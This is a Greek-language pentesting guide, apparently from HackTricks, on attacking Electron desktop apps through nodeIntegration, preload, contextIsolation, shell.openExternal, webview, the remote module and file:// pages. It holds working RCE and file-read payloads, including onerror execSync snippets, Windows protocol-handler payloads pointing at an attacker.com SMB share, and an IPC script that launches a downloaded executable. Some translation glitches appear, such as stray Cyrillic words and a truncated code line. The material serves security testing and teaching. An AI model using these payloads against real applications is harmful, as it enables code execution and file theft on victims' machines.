# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Εισαγωγή

Το Electron συνδυάζει έναν τοπικό backend (με **NodeJS**) και ένα frontend (**Chromium**), αν και του λείπουν ορισμένοι από τους μηχανισμούς ασφαλείας των σύγχρονων προγραμμάτων περιήγησης.

Συνήθως μπορείς να βρεις τον κώδικα της εφαρμογής electron μέσα σε μια εφαρμογή `.asar`, προκειμένου να αποκτήσεις τον κώδικα πρέπει να τον εξαγάγεις:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Στον πηγαίο κώδικα μιας εφαρμογής Electron, μέσα στο `packet.json`, μπορείτε να βρείτε καθορισμένο το αρχείο `main.js` όπου έχουν ρυθμιστεί οι ρυθμίσεις ασφαλείας.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Το Electron έχει 2 τύπους διεργασιών:

- Κύρια Διεργασία (έχει πλήρη πρόσβαση στο NodeJS)
- Διεργασία Απόδοσης (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφαλείας)

![](<../../../images/image (182).png>)

Μια **διεργασία απόδοσης** θα είναι ένα παράθυρο προγράμματος περιήγησης που φορτώνει ένα αρχείο:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Οι ρυθμίσεις της **διαδικασίας renderer** μπορούν να **ρυθμιστούν** στη **κύρια διαδικασία** μέσα στο αρχείο main.js. Ορισμένες από τις ρυθμίσεις θα **αποτρέψουν την εφαρμογή Electron να αποκτήσει RCE** ή άλλες ευπάθειες αν οι **ρυθμίσεις είναι σωστά ρυθμισμένες**.

Η εφαρμογή electron **μπορεί να έχει πρόσβαση στη συσκευή** μέσω των Node APIs, αν και μπορεί να ρυθμιστεί για να το αποτρέψει:

- **`nodeIntegration`** - είναι `off` από προεπιλογή. Αν είναι ενεργοποιημένο, επιτρέπει την πρόσβαση σε χαρακτηριστικά του node από τη διαδικασία renderer.
- **`contextIsolation`** - είναι `on` από προεπιλογή. Αν είναι απενεργοποιημένο, οι κύριες και οι διαδικασίες renderer δεν είναι απομονωμένες.
- **`preload`** - κενό από προεπιλογή.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - είναι απενεργοποιημένο από προεπιλογή. Θα περιορίσει τις ενέργειες που μπορεί να εκτελέσει το NodeJS.
- Node Integration σε Workers
- **`nodeIntegrationInSubframes`** - είναι `off` από προεπιλογή.
- Αν η **`nodeIntegration`** είναι **ενεργοποιημένη**, αυτό θα επιτρέψει τη χρήση των **Node.js APIs** σε ιστοσελίδες που είναι **φορτωμένες σε iframes** μέσα σε μια εφαρμογή Electron.
- Αν η **`nodeIntegration`** είναι **απενεργοποιημένη**, τότε τα preload θα φορτωθούν στο iframe.

Παράδειγμα ρύθμισης:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Ορισμένα **RCE payloads** από [εδώ](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Capture traffic

Τροποποιήστε τη ρύθμιση start-main και προσθέστε τη χρήση ενός proxy όπως:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Αν μπορείτε να εκτελέσετε το Electron App τοπικά, είναι πιθανό να μπορέσετε να το κάνετε να εκτελεί αυθαίρετο κώδικα javascript. Δείτε πώς στο:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Αν το **nodeIntegration** είναι ρυθμισμένο σε **on**, το JavaScript μιας ιστοσελίδας μπορεί να χρησιμοποιήσει εύκολα τις δυνατότητες του Node.js απλά καλώντας το `require()`. Για παράδειγμα, ο τρόπος εκτέλεσης της εφαρμογής calc στα Windows είναι:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Το σενάριο που υποδεικνύεται σε αυτή τη ρύθμιση είναι l**oaded πριν από άλλα σενάρια στον renderer**, έτσι έχει **απεριόριστη πρόσβαση στα Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Επομένως, το σενάριο μπορεί να εξάγει node-features σε σελίδες:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Αν το `contextIsolation` είναι ενεργοποιημένο, αυτό δεν θα λειτουργήσει**

## RCE: XSS + contextIsolation

Το _**contextIsolation**_ εισάγει **χωριστά συμφραζόμενα μεταξύ των σεναρίων της ιστοσελίδας και του εσωτερικού κώδικα JavaScript του Electron** έτσι ώστε η εκτέλεση JavaScript κάθε κώδικα να μην επηρεάζει η μία την άλλη. Αυτή είναι μια απαραίτητη δυνατότητα για να εξαλειφθεί η πιθανότητα RCE.

Αν τα συμφραζόμενα δεν είναι απομονωμένα, ένας επιτιθέμενος μπορεί να:

1. Εκτελέσει **τυχαίο JavaScript στον renderer** (XSS ή πλοήγηση σε εξωτερικές ιστοσελίδες)
2. **Επαναγράψει τη встроμένη μέθοδο** που χρησιμοποιείται στον preload ή στον εσωτερικό κώδικα του Electron σε δική του συνάρτηση
3. **Ενεργοποιήσει** τη χρήση της **επαναγραμμένης συνάρτησης**
4. RCE;

Υπάρχουν 2 μέρη όπου οι встроμένες μέθοδοι μπορούν να επαναγραφούν: Στον κώδικα preload ή στον εσωτερικό κώδικα του Electron:

{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}

{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}

{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Παράκαμψη γεγονότος κλικ

Αν υπάρχουν περιορισμοί που εφαρμόζονται όταν κάνετε κλικ σε έναν σύνδεσμο, μπορεί να είστε σε θέση να τους παρακάμψετε **κάνοντας ένα μεσαίο κλικ** αντί για ένα κανονικό αριστερό κλικ.
```javascript
window.addEventListener('click', (e) => {
```
## RCE μέσω shell.openExternal

Για περισσότερες πληροφορίες σχετικά με αυτά τα παραδείγματα, ελέγξτε [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) και [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Κατά την ανάπτυξη μιας εφαρμογής Electron desktop, είναι κρίσιμο να διασφαλιστούν οι σωστές ρυθμίσεις για το `nodeIntegration` και το `contextIsolation`. Είναι αποδεκτό ότι η **εκτέλεση απομακρυσμένου κώδικα (RCE)** από την πλευρά του πελάτη που στοχεύει σε preload scripts ή στον εγγενή κώδικα του Electron από τη βασική διαδικασία αποτρέπεται αποτελεσματικά με αυτές τις ρυθμίσεις σε εφαρμογή.

Όταν ένας χρήστης αλληλεπιδρά με συνδέσμους ή ανοίγει νέα παράθυρα, ενεργοποιούνται συγκεκριμένοι ακροατές γεγονότων, οι οποίοι είναι κρίσιμοι για την ασφάλεια και τη λειτουργικότητα της εφαρμογής:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Αυτοί οι ακροατές είναι **υπερκαλυμμένοι από την επιτραπέζια εφαρμογή** για να υλοποιήσουν τη δική τους **λογική επιχειρήσεων**. Η εφαρμογή αξιολογεί αν ένας πλοηγημένος σύνδεσμος θα πρέπει να ανοιχτεί εσωτερικά ή σε έναν εξωτερικό φυλλομετρητή. Αυτή η απόφαση συνήθως λαμβάνεται μέσω μιας συνάρτησης, `openInternally`. Αν αυτή η συνάρτηση επιστρέψει `false`, υποδεικνύει ότι ο σύνδεσμος θα πρέπει να ανοιχτεί εξωτερικά, χρησιμοποιώντας τη συνάρτηση `shell.openExternal`.

**Εδώ είναι ένας απλοποιημένος ψευδοκώδικας:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Οι καλύτερες πρακτικές ασφαλείας του Electron JS προειδοποιούν κατά της αποδοχής μη αξιόπιστου περιεχομένου με τη συνάρτηση `openExternal`, καθώς αυτό θα μπορούσε να οδηγήσει σε RCE μέσω διαφόρων πρωτοκόλλων. Τα λειτουργικά συστήματα υποστηρίζουν διαφορετικά πρωτόκολλα που μπορεί να ενεργοποιήσουν RCE. Για λεπτομερείς παραδείγματα και περαιτέρω εξήγηση σχετικά με αυτό το θέμα, μπορεί κανείς να ανατρέξει [σε αυτό το πόρο](https://positive.security/blog/url-open-rce#windows-10-19042), ο οποίος περιλαμβάνει παραδείγματα πρωτοκόλλων Windows ικανά να εκμεταλλευτούν αυτή την ευπάθεια.

Στο macos, η συνάρτηση `openExternal` μπορεί να εκμεταλλευτεί για να εκτελέσει αυθαίρετες εντολές όπως στο `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Παραδείγματα εκμεταλλεύσεων πρωτοκόλλων Windows περιλαμβάνουν:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + ευάλωτο preload IPC + shell.openExternal

Αυτή η ευπάθεια μπορεί να βρεθεί σε **[αυτή την αναφορά](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Το **webviewTag** είναι μια **παρωχημένη δυνατότητα** που επιτρέπει τη χρήση του **NodeJS** στη **διαδικασία απόδοσης**, η οποία θα πρέπει να απενεργοποιείται καθώς επιτρέπει τη φόρτωση ενός script μέσα στο πλαίσιο preload όπως:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Ως εκ τούτου, ένας επιτιθέμενος που καταφέρνει να φορτώσει μια αυθαίρετη σελίδα θα μπορούσε να χρησιμοποιήσει αυτή την ετικέτα για να **φορτώσει ένα αυθαίρετο script προφόρτωσης**.

Αυτό το script προφόρτωσης καταχράστηκε στη συνέχεια για να καλέσει μια **ευάλωτη υπηρεσία IPC (`skype-new-window`)** που καλούσε **`shell.openExternal`** για να αποκτήσει RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Ανάγνωση Εσωτερικών Αρχείων: XSS + contextIsolation

**Η απενεργοποίηση του `contextIsolation` επιτρέπει τη χρήση των ετικετών `<webview>`**, παρόμοια με τις `<iframe>`, για την ανάγνωση και εξαγωγή τοπικών αρχείων. Ένα παράδειγμα που παρέχεται δείχνει πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να διαβάσετε το περιεχόμενο εσωτερικών αρχείων:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Επιπλέον, μια άλλη μέθοδος για **την ανάγνωση ενός εσωτερικού αρχείου** μοιράζεται, επισημαίνοντας μια κρίσιμη ευπάθεια ανάγνωσης τοπικών αρχείων σε μια εφαρμογή Electron desktop. Αυτό περιλαμβάνει την έγχυση ενός script για να εκμεταλλευτείτε την εφαρμογή και να εξαγάγετε δεδομένα:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Παλιός Chromium**

Αν ο **chromium** που χρησιμοποιείται από την εφαρμογή είναι **παλιός** και υπάρχουν **γνωστές** **ευπάθειες** σε αυτόν, μπορεί να είναι δυνατό να **εκμεταλλευτείς το και να αποκτήσεις RCE μέσω ενός XSS**.\
Μπορείς να δεις ένα παράδειγμα σε αυτή τη **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing μέσω παράκαμψης regex εσωτερικού URL**

Υποθέτοντας ότι βρήκες ένα XSS αλλά **δεν μπορείς να ενεργοποιήσεις RCE ή να κλέψεις εσωτερικά αρχεία**, θα μπορούσες να προσπαθήσεις να το χρησιμοποιήσεις για να **κλέψεις διαπιστευτήρια μέσω phishing**.

Πρώτα απ' όλα, πρέπει να ξέρεις τι συμβαίνει όταν προσπαθείς να ανοίξεις μια νέα διεύθυνση URL, ελέγχοντας τον κωδικό JS στο front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Η κλήση της **`openInternally`** θα αποφασίσει αν το **link** θα **ανοίξει** στο **παράθυρο επιφάνειας εργασίας** καθώς είναι ένα link που ανήκει στην πλατφόρμα, **ή** αν θα ανοίξει στον **φυλλομετρητή ως πόρος τρίτου μέρους**.

Σε περίπτωση που η **regex** που χρησιμοποιείται από τη συνάρτηση είναι **ευάλωτη σε παρακάμψεις** (για παράδειγμα, **μη διαφεύγοντας τα σημεία των υποτομέων**), ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί το XSS για να **ανοίξει ένα νέο παράθυρο το οποίο** θα βρίσκεται στην υποδομή του επιτιθέμενου **ζητώντας διαπιστευτήρια** από τον χρήστη:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Πρωτόκολλο

Όπως αναφέρεται στα [έγγραφα](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), οι σελίδες που εκτελούνται σε **`file://`** έχουν μονομερή πρόσβαση σε κάθε αρχείο στον υπολογιστή σας, πράγμα που σημαίνει ότι **τα ζητήματα XSS μπορούν να χρησιμοποιηθούν για να φορτώσουν αυθαίρετα αρχεία** από τον υπολογιστή του χρήστη. Η χρήση ενός **προσαρμοσμένου πρωτοκόλλου** αποτρέπει τέτοια ζητήματα, καθώς μπορείτε να περιορίσετε το πρωτόκολλο ώστε να εξυπηρετεί μόνο ένα συγκεκριμένο σύνολο αρχείων.

## Απομακρυσμένο module

Το απομακρυσμένο module του Electron επιτρέπει στους **renderer processes να έχουν πρόσβαση σε APIs του κύριου process**, διευκολύνοντας την επικοινωνία εντός μιας εφαρμογής Electron. Ωστόσο, η ενεργοποίηση αυτού του module εισάγει σημαντικούς κινδύνους ασφαλείας. Επεκτείνει την επιφάνεια επίθεσης της εφαρμογής, καθιστώντας την πιο ευάλωτη σε τρωτά σημεία όπως οι επιθέσεις cross-site scripting (XSS).

> [!TIP]
> Αν και το **remote** module εκθέτει ορισμένα APIs από τον κύριο στους renderer processes, δεν είναι απλό να αποκτήσετε RCE μόνο εκμεταλλευόμενοι τα components. Ωστόσο, τα components μπορεί να εκθέτουν ευαίσθητες πληροφορίες.

> [!WARNING]
> Πολλές εφαρμογές που εξακολουθούν να χρησιμοποιούν το remote module το κάνουν με τρόπο που **απαιτεί να είναι ενεργοποιημένο το NodeIntegration** στη διαδικασία renderer, το οποίο είναι **μεγάλος κίνδυνος ασφαλείας**.

Από το Electron 14, το `remote` module του Electron μπορεί να ενεργοποιηθεί σε αρκετά βήματα, λόγω λόγων ασφαλείας και απόδοσης είναι **συνιστώμενο να μην το χρησιμοποιείτε**.

Για να το ενεργοποιήσετε, θα πρέπει πρώτα να **το ενεργοποιήσετε στη διαδικασία κύριου**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Στη συνέχεια, η διαδικασία απόδοσης μπορεί να εισάγει αντικείμενα από το module όπως:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Το **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** υποδεικνύει μερικές ενδιαφέρουσες **λειτουργίες** που εκτίθενται από το αντικείμενο **`app`** από το απομακρυσμένο module:

- **`app.relaunch([options])`**
- **Επαναλαμβάνει** την εφαρμογή **αποχωρώντας** από την τρέχουσα παρουσία και **εκκινώντας** μια νέα. Χρήσιμο για **ενημερώσεις εφαρμογής** ή σημαντικές **αλλαγές κατάστασης**.
- **`app.setAppLogsPath([path])`**
- **Ορίζει** ή **δημιουργεί** έναν φάκελο για την αποθήκευση των **καταγραφών εφαρμογής**. Οι καταγραφές μπορούν να **ανακτηθούν** ή να **τροποποιηθούν** χρησιμοποιώντας **`app.getPath()`** ή **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Καταχωρεί** το τρέχον εκτελέσιμο ως τον **προεπιλεγμένο χειριστή** για έναν συγκεκριμένο **πρωτόκολλο**. Μπορείτε να παρέχετε μια **προσαρμοσμένη διαδρομή** και **παραμέτρους** αν χρειαστεί.
- **`app.setUserTasks(tasks)`**
- **Προσθέτει** εργασίες στην **κατηγορία Εργασιών** στη **Λίστα Γρήγορων Συνδέσμων** (σε Windows). Κάθε εργασία μπορεί να ελέγξει πώς εκκινείται η εφαρμογή ή ποιες **παράμετροι** περνούν.
- **`app.importCertificate(options, callback)`**
- **Εισάγει** ένα **πιστοποιητικό PKCS#12** στο **κατάστημα πιστοποιητικών** του συστήματος (μόνο Linux). Ένα **callback** μπορεί να χρησιμοποιηθεί για να χειριστεί το αποτέλεσμα.
- **`app.moveToApplicationsFolder([options])`**
- **Μετακινεί** την εφαρμογή στον **φάκελο Εφαρμογών** (σε macOS). Βοηθά να διασφαλιστεί μια **τυπική εγκατάσταση** για τους χρήστες Mac.
- **`app.setJumpList(categories)`**
- **Ορίζει** ή **αφαιρεί** μια **προσαρμοσμένη Λίστα Γρήγορων Συνδέσμων** σε **Windows**. Μπορείτε να καθορίσετε **κατηγορίες** για να οργανώσετε πώς εμφανίζονται οι εργασίες στον χρήστη.
- **`app.setLoginItemSettings(settings)`**
- **Ρυθμίζει** ποια **εκτελέσιμα** εκκινούν κατά την **είσοδο** μαζί με τις **επιλογές** τους (μόνο macOS και Windows).
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Η **κύρια API** για την πρόσβαση στις ρυθμίσεις συστήματος και την **εκπομπή συστημικών γεγονότων** στο Electron. Μέθοδοι όπως **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** και **setUserDefault** είναι όλες **μέρος του** αυτού του module.

**Example usage:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Ακούει** για **εγγενείς ειδοποιήσεις macOS** χρησιμοποιώντας NSDistributedNotificationCenter.
* Πριν από **macOS Catalina**, μπορούσατε να καταγράψετε **όλες** τις διανεμόμενες ειδοποιήσεις περνώντας **nil** στο CFNotificationCenterAddObserver.
* Μετά από **Catalina / Big Sur**, οι εφαρμογές σε sandbox μπορούν να **εγγραφούν** σε **πολλές εκδηλώσεις** (για παράδειγμα, **κλειδώματα/ξεκλειδώματα οθόνης**, **συνδέσεις τόμου**, **δραστηριότητα δικτύου**, κ.λπ.) καταχωρώντας ειδοποιήσεις **κατά όνομα**.

### **getUserDefault / setUserDefault**

* **Διασυνδέεται** με **NSUserDefaults**, το οποίο αποθηκεύει **προτιμήσεις** εφαρμογής ή **παγκόσμιες** προτιμήσεις στο macOS.

* **getUserDefault** μπορεί να **ανακτήσει** ευαίσθητες πληροφορίες, όπως **τοποθεσίες πρόσφατων αρχείων** ή **γεωγραφική τοποθεσία χρήστη**.

* **setUserDefault** μπορεί να **τροποποιήσει** αυτές τις προτιμήσεις, επηρεάζοντας ενδεχομένως τη **διαμόρφωση** μιας εφαρμογής.

* Σε **παλαιότερες εκδόσεις Electron** (πριν από v8.3.0), μόνο η **τυπική σουίτα** του NSUserDefaults ήταν **προσβάσιμη**.

## Shell.showItemInFolder

Αυτή η λειτουργία εμφανίζει το δοθέν αρχείο σε έναν διαχειριστή αρχείων, ο οποίος **μπορεί να εκτελέσει αυτόματα το αρχείο**.

Για περισσότερες πληροφορίες δείτε [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Οι εφαρμογές Electron θα πρέπει να έχουν μια **Πολιτική Ασφαλείας Περιεχομένου (CSP)** για να **αποτρέπουν επιθέσεις XSS**. Η **CSP** είναι ένα **πρότυπο ασφαλείας** που βοηθά να **αποτραπεί** η **εκτέλεση** **μη αξιόπιστου κώδικα** στον περιηγητή.

Συνήθως **ρυθμίζεται** στο αρχείο **`main.js`** ή στο πρότυπο **`index.html`** με την CSP μέσα σε μια **meta tag**.

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}

## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) είναι ένα εργαλείο για την αναγνώριση κακών ρυθμίσεων και προτύπων ασφαλείας σε εφαρμογές βασισμένες σε Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) είναι ένα ανοιχτού κώδικα plugin VS Code για εφαρμογές Electron που χρησιμοποιεί το Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) για να ελέγξετε ευάλωτες βιβλιοθήκες τρίτων.
- [**Electro.ng**](https://electro.ng/): Πρέπει να το αγοράσετε.

## Labs

Στο [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) μπορείτε να βρείτε ένα εργαστήριο για την εκμετάλλευση ευάλωτων εφαρμογών Electron.

Ορισμένες εντολές που θα σας βοηθήσουν με το εργαστήριο:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Αναφορές**

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- Περισσότερες έρευνες και αναφορές σχετικά με την ασφάλεια του Electron στο [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
